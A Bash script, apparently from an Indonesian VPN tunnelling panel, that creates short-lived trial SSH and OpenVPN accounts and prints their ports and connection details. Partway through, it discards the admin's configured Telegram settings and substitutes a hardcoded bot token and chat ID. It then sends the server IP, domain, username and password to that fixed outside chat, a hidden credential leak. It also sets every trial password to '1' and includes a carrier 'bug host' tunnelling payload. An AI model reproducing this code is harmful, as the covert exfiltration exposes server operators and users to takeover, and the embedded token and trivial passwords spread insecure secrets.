DF='\e[39m'
Bold='\e[1m'
Blink='\e[5m'
yell='\e[33m'
red='\e[31m'
green='\e[32m'
blue='\e[34m'
PURPLE='\e[35m'
cyan='\e[36m'
Lred='\e[91m'
Lgreen='\e[92m'
Lyellow='\e[93m'
NC='\e[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
LIGHT='\033[0;37m'
grenbo="\e[92;1m"
# Getting
CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10 )
CITY=$(curl -s ipinfo.io/city )
domain=$(cat /etc/xray/domain)
clear
IP=$(curl -sS ipv4.icanhazip.com)
Login=Trial-`</dev/urandom tr -dc X-Z0-9 | head -c4`
hari="1"
Pass=1
clear
tgl=$(date -d "$masaaktif days" +"%d")
bln=$(date -d "$masaaktif days" +"%b")
thn=$(date -d "$masaaktif days" +"%Y")
expe="$tgl $bln, $thn"
tgl2=$(date +"%d")
bln2=$(date +"%b")
thn2=$(date +"%Y")
tnggl="$tgl2 $bln2, $thn2"
useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
hariini=`date -d "0 days" +"%Y-%m-%d"`
expi=`date -d "$masaaktif days" +"%Y-%m-%d"`
echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
echo -e " Set Expired In Minutes           "
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
read -p " Menit : " pup
CHATID="5008116231"
   KEY="6638955090:AAESojtt1ZPmuTNESoNHfgyPdU92Ue7d4H4"
  TIME="10"
   URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
<code>Your Premium VPN Details</code>
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
<code>IP Address    =</code> <code>$IP</code>
<code>Hostname      =</code> <code>$domain</code>
<code>Username      =</code> <code>$Login</code>
<code>Password      =</code> <code>$Pass</code>
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
<code>OpenSSH       = 22
Dropbear      = 443, 109, 143
SSL/TLS       = 400-900
SSH WS TLS    = 443
SSH WS NTLS   = 80, 8080, 8081-9999
OVPN WS NTLS  = 80, 8080, 8880
OVPN WS TLS   = 443
BadVPN UDP    = 7100,7200,7300</code>
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
Ovpn Download : https://$domain:81/
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
Save Link Account: https://$domain:81/ssh-$Login.txt
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
Berakhir Pada  : $pup Menit
<code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
mkdir -p /etc/ssh

if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/ssh/${Login}
fi
DATADB=$(cat /etc/ssh/.ssh.db | grep "^###" | grep -w "${Login}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${Login}\b/d" /etc/ssh/.ssh.db
fi
echo "### ${Login} " >>/etc/ssh/.ssh.db
echo ""
cat > /var/www/html/ssh-$Login.txt <<-END
=========================
Format SSH OVPN Account
=========================
Username         : $Login
Password         : $Pass
Berakhir Pada  : $pup Menit
=========================
IP               : $IP
Host             : $domain
Port OpenSSH     : 443, 80, 22
Port Dropbear    : 443, 109
Port SSH UDP     : 1-65535
Port SSH WS      : 80, 8080, 8081-9999
Port SSH SSL WS  : 443
Port SSL/TLS     : 400-900
Port OVPN WS SSL : 443
Port OVPN SSL    : 443
Port OVPN TCP    : 1194
Port OVPN UDP    : 2200
BadVPN UDP       : 7100, 7300, 7300
=================================
Payload WSS: GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf] 
=================================
OVPN Download : https://$domain:81/
=================================

END
echo userdel -f "$Login" | at now + $pup minutes
clear
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
echo -e "  Trial SSH & OpenVPN"
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
echo -e " Username         : $Login"
echo -e " Password         : $Pass"
echo -e " IP/Host          : $IP"
echo -e " Domain SSH       : $domain"
echo -e " OpenSSH          : 22"
echo -e " Dropbear         : 80, 8080"
echo -e "Port SSH UDP     : 1-65535"
echo -e " SSL/TLS          : 400-900"
echo -e " SSH Ws Non SSL   : 80, 8080, 8081-9999"
echo -e " SSH Ws SSL       : 443"
echo -e " OVPN Ws Non SSL  : 80"
echo -e " OVPN Ws SSL      : 443"
echo -e " BadVPN UDPGW     : 7100,7200,7300"
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
echo -e " OVPN Download : https://$domain:81/"
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
echo -e "Save Link Account: https://$domain:81/ssh-$Login.txt"
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
#echo -e "Aktif Selama   : $masaaktif Hari"
#echo -e "Dibuat Pada    : $tnggl"
echo -e "Berakhir Pada  : $pup Menit"
echo -e "\033[1;93mâ—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
menu